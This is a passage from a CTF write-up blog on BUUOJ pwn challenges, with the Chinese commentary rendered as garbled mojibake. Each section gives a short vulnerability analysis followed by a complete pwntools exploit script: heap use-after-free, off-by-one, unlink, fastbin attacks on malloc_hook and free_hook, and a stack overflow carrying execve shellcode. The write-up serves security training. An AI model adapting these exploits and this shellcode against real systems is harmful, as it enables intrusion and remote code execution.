æƒ³äº†è€ä¹…ã€‚åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œï¼Œå½’ç±»ä¸ºç®€å•é¢˜ã€‚å¤ªèœäº†å¤ªèœäº†ï¼ŒåŸºç¡€è¿˜ä¸æ˜¯å¾ˆå¥½ã€‚</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç®€å•çš„uaf</p><h4 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h4><pre><code class="c">(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code></pre><p>æ­¤å¤„åœ¨æ”¹å®Œ<code>ptr[v1]</code>ä¸ºsystemä»¥åï¼Œå…¶å‚æ•°çš„æŒ‡é’ˆæ˜¯ä»è¿™ä¸ªå †å—å¼€å§‹çš„è¦æå‰è¿›è¡Œæˆªæ–­ã€‚</p><pre><code class="c">system(p32(system) + &#39;||sh&#39;)system(p32(system) + &#39;;sh;&#39;)</code></pre><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./hacknote&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)else:    io = remote(&#39;node3.buuoj.cn&#39;,27225)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;Content&#39;,str(data))def free(idx):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x20,&#39;bbbb&#39;)add(0x20,&#39;bbbb&#39;)free(0)free(1)add(8,p32(0x0804862B) + p32(elf.got[&#39;__libc_start_main&#39;]))show(0)r()libc_base = uu32(r(4)) - 0x18540info_addr(&#39;base&#39;,libc_base)free(2)system = 0x0003ada0 + libc_baseadd(8,p32(system) + &#39;||sh&#39;)show(0)itr()</code></pre><p>Buuè¿œç¨‹æ‰“ä¸é€šã€‚ã€‚</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°å¤„ï¼Œæ•…æ„å¯ä»¥å¤šå†™å‡ºä¸€ä¸ªå­—èŠ‚ã€‚</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./heapcreator&#39;context.log_level = &#39;debug&#39;elf = ELF(local_file)debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26646)    libc = elf.libc    # remote_libc = &#39;.&#39; # &#39;./libc.so.6&#39;    # libc = ELF(remote_libc)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;Heap&#39;,str(size))    sa(&#39;heap&#39;,str(data))def edit(idx,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;heap&#39;,str(data))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x18,&#39;\x00&#39;)add(0x20,&#39;bbbb&#39;)add(0x20,&#39;cccc&#39;)add(0x10,&#39;dddd&#39;)payload = 0x18 * &#39;a&#39; + &#39;\xa1&#39;edit(0,payload)free(1)add(0x10,&#39;\x78&#39;)show(1)ru(&#39;Content : &#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)free(1)free_hook = 0x3c67a8 + basepaylaod = &#39;\x00&#39; * 2 * 8  + p64(8) + p64(free_hook)add(0x30,paylaod)rce = base + rce16[1]edit(2,p64(rce))free(0)itr()</code></pre><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ï¼Œç¨‹åºé€†å‘èµ·æ¥çœ‹èµ·æ¥å¾ˆä¹±ï¼Œå¹¶ä¸”å †å—å®šä½æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚ï¼Œæ²¡æœ‰å…¨å±€æŒ‡é’ˆã€‚</p><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>calloc å‡½æ•°åŸºæœ¬è·Ÿmallocä¸€æ ·ï¼Œä½†æ˜¯å†åˆ†é…å¥½å †å—æ—¶ï¼Œä¼šæŠŠåˆ†é…åˆ°çš„å †å—å…¨éƒ¨æ¸…ç†ä¸º0ã€‚</p><h5 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h5><p>æ— æ³•é€šè¿‡ä¼ ç»Ÿçš„unsortbinæ¥leak libcï¼Œç»“åˆfillå‡½æ•°ä¸­çš„å †æº¢å‡ºå³å¯ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>Fill å‡½æ•°ä¸­ï¼Œæ˜æ˜¾æœ‰å †æº¢å‡ºï¼Œä¸”ååˆ†å¥½ç”¨ï¼Œæ•ˆæœå¾ˆå¤§ã€‚</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./0ctf_2017_babyheap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26374)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;Command&#39;,&#39;1&#39;)    sla(&#39;Size&#39;,str(size))def fill(idx,size,data):    sla(&#39;mand&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ize&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;mand&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def dump(idx):    sla(&#39;mand&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x30) #0add(0x30) #1add(0x10) #2add(0x10) #3add(0x10) #4add(0x20) #5payload = &#39;a&#39; * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4fill(0,0x60,payload)free(1)add(0x30)dump(2)ru(&#39;Content: \n&#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)add(0x50) #6add(0x60) #7add(0x60) #8free(7)free(8)malloc_hook = base + 0x3c4b10payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) fill(5,len(payload),payload)add(0x60) #7add(0x60) #8rec = rce16[1] + basepayload = &#39;a&#39; * 0x13 + p64(rec)fill(8,len(payload),payload)add(0x20)itr()</code></pre><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><pre><code class="c">close(1);close(2);return shell();</code></pre><p>ç›´æ¥å°±ç»™ä½ shelläº†ï¼Œä½†æ˜¯stdoutå·²ç»è¢«å…³é—­äº†ã€‚ä½†æ˜¯å¯¹å…¶æ–‡ä»¶æè¿°ç¬¦<code>1</code>è¿›è¡Œé‡å®šå‘ä¸ºæ²¡æœ‰å…³é—­çš„<code>0</code>å³å¯ã€‚</p><pre><code class="bash">exec 1&gt;&amp;0 &amp;&amp; cat flag</code></pre><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">ssize_t vulnerable(){  char buf; // [esp+0h] [ebp-18h]  return read(0, &amp;buf, 0x24u);}</code></pre><p>æ˜æ˜¾å¯ä»¥çœ‹å‡ºåªå¯ä»¥æ§åˆ¶2ä¸ªgadgetã€‚ä¼˜å…ˆæƒ³åˆ°äº†æ ˆè¿ç§»ã€‚å¯æ˜¯ä¹Ÿæ²¡æœ‰åˆé€‚åœ°æ–¹å»è¿ç§»åˆ©ç”¨ã€‚</p><p>å€˜è‹¥å¯ä»¥æ§åˆ¶3ä¸ªgadgetï¼Œç›´æ¥ï¼š</p><pre><code class="c">p32(system.plt) + p32(0xdeadbeef) + p32(sh)</code></pre><p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><p>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±<strong>ååˆ†</strong>ç»å¸¸**ç”¨<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code>ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</p><h4 id="çªç ´"><a href="#çªç ´" class="headerlink" title="çªç ´"></a>çªç ´</h4><p>ä½†æ˜¯å°è¯•å»çœ‹ä¸‹åé—¨å‡½æ•°ï¼š</p><pre><code class="c">.text:08048521 ; 2:   return system(&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;);.text:08048521                 sub     esp, 0Ch.text:08048524                 push    offset command  ; &quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;.text:08048529                 call    _system.text:0804852E                 add     esp, 10h.text:08048531                 nop.text:08048532                 leave.text:08048533                 retn</code></pre><p>åœ¨08048524å¤„ï¼Œå¯ä»¥çœ‹åˆ°èµ·å…¶call systemå‰ï¼Œ<code>push    offset command</code>ï¼ŒæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å‹æ ˆï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p> é‚£å°±åœ¨æº¢å‡ºæ—¶ï¼Œè¿”å›åœ°å€å¡«ä¸Š<code>08048529</code> ï¼Œåœ¨è‡ªå·±å¡«ä¸Šshçš„åœ°å€å³å¯äº†ã€‚</p><p>è¿™æ ·å°±åœ¨call systemæ—¶ï¼Œå®Œæˆçš„æ˜¯<code>system(sh)</code>ã€‚</p><p>å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼š</p><p>ç”±äº<code>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±ç»å¸¸ç”¨`å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1`ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</code> ï¼Œå…¶å®è‡ªå·±åˆ†æä»¥åå°±æ˜¯ï¼š<code>å‡½æ•°çš„plt+4å­—èŠ‚+å‚æ•°1</code>ã€‚</p><p>æº¢å‡ºæ—¶ï¼Œå¡«ä¸Š<code>p32(0x8048529) + p32(sh)</code><br>æ ˆä¿¡æ¯ï¼š</p><pre><code>0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;:     call   0x80483e0 &lt;system@plt&gt;)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>åœ¨æº¢å‡ºè°ƒç”¨æ—¶,retåˆ°ï¼š</p><pre><code>.text:08048529                 call    _system</code></pre><p>å…¶å°±æ˜¯</p><pre><code>push eip+4jmp system.plt</code></pre><p>ç„¶åæ ˆå°±å˜æˆäº†ï¼š</p><pre><code>=&gt; 0x80483e0 &lt;system@plt&gt;:      jmp    DWORD PTR ds:0x804a018 | 0x80483e6 &lt;system@plt+6&gt;:    push   0x18 | 0x80483eb &lt;system@plt+11&gt;:   jmp    0x80483a0 | 0x80483f0 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a01c | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push   0x20 |-&gt;   0x80483e6 &lt;system@plt+6&gt;:        push   0x18       0x80483eb &lt;system@plt+11&gt;:       jmp    0x80483a0       0x80483f0 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a01c       0x80483f6 &lt;__libc_start_main@plt+6&gt;:     push   0x20                                                                  JUMP is taken[------------------------------------stack-------------------------------------]0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;:     add    esp,0x10)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>è¿™å°±å˜æˆäº†ï¼Œè‡ªå·±ç†Ÿæ‚‰çš„<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./wustctf2020_getshell_2&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25032)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]offset = 28sh = elf.search(&#39;sh\x00&#39;).next()system = 0x8048529payload = &#39;a&#39; * offset + p32(system) + p32(sh)s(payload)itr()</code></pre><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="åˆ†æ-16"><a href="#åˆ†æ-16" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚</p><h4 id="æ¼æ´ç‚¹-2"><a href="#æ¼æ´ç‚¹-2" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„æ¼å‡ºç¨‹åºå’Œlibcçš„åŸºå€</li><li>editå‡½æ•°ä¸­ï¼Œé”™è¯¯çš„sizeé€‰å–ï¼Œå¯¼è‡´æ¯æ¬¡å¯ä»¥å¤šæº¢å‡º0x10çš„å­—èŠ‚ï¼Œå¨åŠ›å°±å¾ˆå¤§äº†ï¼Œprev sizeä¸ sizeéƒ½å¯ä»¥æ”¹åˆ°ã€‚</li></ul><p>ç›´æ¥è¿›è¡Œunlinkæ”»å‡»å³å¯ã€‚ä¼°è®¡å°±æ˜¯è€ƒè¿™ä¸ªçš„ï¼Œç¨‹åºé™åˆ¶äº†ä¸èƒ½ç”³è¯·0x80ä»¥ä¸‹çš„å †å—ï¼Œä¸”keyå€¼åŸºæœ¬æ²¡åŠæ³•æ”¹åˆ°ã€‚</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_heap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26837)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;(0-10)&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sla(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;content&#39;,str(data))payload = &#39;%15$p&#39; + &#39;%11$p&#39;sla(&#39;name&#39;,payload)ru(&#39;Hello, 0x&#39;)libc_base = int(r(12),16) - 0x20830info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;0x&#39;)bin_base = int(r(12),16) - 0x1186info_addr(&#39;bin_base&#39;,bin_base)note = bin_base + 0x202060key = bin_base + 0x202040add(0,0x88,&#39;aaaaaaaa&#39;)add(1,0x100,&#39;bbbbbbbb&#39;)add(2,0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,payload)free(1)free_hook = 0x3c67a8 + libc_basepayload = p64(0) * 3 + p64(free_hook) + p64(0x88)edit(0,payload)rec = rce16[1] + libc_baseedit(0,p64(rec))free(2)itr()</code></pre><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="åˆ†æ-17"><a href="#åˆ†æ-17" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°ä¸­ï¼Œæœ‰ä¸ªå¤§å¨åŠ›çš„å †æº¢å‡ºã€‚<br>ç”¨unlinkæ”»å‡»ã€‚</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26818)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def edit(idx,size,data):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;choice&#39;,&#39;1&#39;)def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))note = 0x006020C0 + 8add(0x88,&#39;aaaaaaaa&#39;)add(0x100,&#39;bbbbbbbb&#39;)add(0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,len(payload),payload)free(1)show()ru(&#39;0 : &#39;)libc_base = uu64(r(6)) - 0x3c48e0info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3c67a8 + libc_basepayload = p64(libc_base + 0x3c48e0) + p64(0)  + p64(0x88) + p64(free_hook)edit(0,len(payload),payload)rec = rce16[1] + libc_baseedit(0,8,p64(rec))free(2)itr()</code></pre><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="åˆ†æ-18"><a href="#åˆ†æ-18" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å…³ï¼Œç›®æ ‡å®šä½ç€shellcodeå»ã€‚</p><h4 id="æ¼æ´ç‚¹-3"><a href="#æ¼æ´ç‚¹-3" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>æ ˆæº¢å‡ºï¼Œå¯ä»¥æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯32ä½ç¨‹åºç”¨ropå°±å¯ä»¥æ‰“äº†ã€‚ä½†æ˜¯ä¸ºç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ã€‚</p><pre><code class="python">.text:08048551             hint            proc near.text:08048551             ; __unwind {.text:08048551 55                          push    ebp.text:08048552 89 E5                       mov     ebp, esp.text:08048554 FF E4                       jmp     esp.text:08048554             hint            endp</code></pre><p>åœ¨é¢˜ç›®å½“ä¸­ï¼Œæœ‰ä¸ªhintå‡½æ•°ï¼Œå°±æ˜¯ç»™æç¤ºçš„ï¼Œæç¤ºåˆ°<code>jmp esp</code> è¿™ä¸ªgadgetã€‚</p><p>å…¶ä¸­ï¼Œå¯ä»¥æƒ³åˆ°åœ¨æ ˆæº¢å‡ºä¸­ï¼Œæœ‰ç»™<code>ret addr</code>å¡«ä¸Š<code>jmp esp</code> ï¼Œåœ¨æ¥ä¸Šshellcodeã€‚è¿™åº”è¯¥æ˜¯å¾ˆç»å…¸çš„ç”¨æ³•ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>æ„é€ æ€è·¯ï¼š</p><pre><code>Payload = overflow + jmp esp address + shellcode</code></pre><p>ä½†æ˜¯è¿™ä¸ªé¢˜å°±æ˜¯åªèƒ½æº¢å‡º14å­—èŠ‚ï¼Œè¿”å›åœ°å€å†å ç”¨4å­—èŠ‚ï¼Œåº”è¯¥æ²¡æœ‰10å­—èŠ‚è¿™æ ·å°‘çš„shellcodeã€‚</p><p>æ‰€ä»¥è½¬å˜ä¸€ä¸‹ï¼Œæ ˆä¸Šå¡«å……å¥½shellcodeï¼Œç„¶å<code>jmp esp address</code>ï¼Œæ¥ç€è®©å…¶æ‰§è¡Œ<code>sub esp,0x28</code>ï¼Œç„¶ååœ¨è·³è½¬espã€‚</p><pre><code>Payload = shellcode + jmp esp address + sub esp,esp + jmp esp</code></pre><p>å…¶å®åŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåé¢è·Ÿä¸Šçš„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºè°ƒæ•´espæŒ‡é’ˆçš„shellcodeã€‚</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_9&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26283)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()jmp_esp = 0x08048554shellcode= &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;shellcode = shellcode.ljust(0x24,&#39;\x00&#39;)gadgets = asm(&#39;sub esp,0x28;jmp esp&#39;)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets# debug()sl(payload)itr()</code></pre><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="åˆ†æ-19"><a href="#åˆ†æ-19" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="æ¼æ´ç‚¹-4"><a href="#æ¼æ´ç‚¹-4" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>ç¨‹åºç”¨reallocå‡½æ•°æ¥åˆ†é…å †å—ï¼Œå› ä¸ºä¸ç†Ÿæ‚‰è¿™ä¸ªæçš„æˆ‘ï¼Œå¥½ä¹…æ²¡æœ‰åšå‡ºæ¥ã€‚</p><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><h4 id="reallocçš„ç‰¹ç‚¹"><a href="#reallocçš„ç‰¹ç‚¹" class="headerlink" title="reallocçš„ç‰¹ç‚¹"></a>reallocçš„ç‰¹ç‚¹</h4><p>åŸºç¡€åŠŸèƒ½æ˜¯æ”¹å˜<code>mem_address</code>æ‰€æŒ‡å†…å­˜åŒºåŸŸçš„å¤§å°ä¸ºnewsizeé•¿åº¦ã€‚è¿™é‡Œå°±æœ‰å‡ 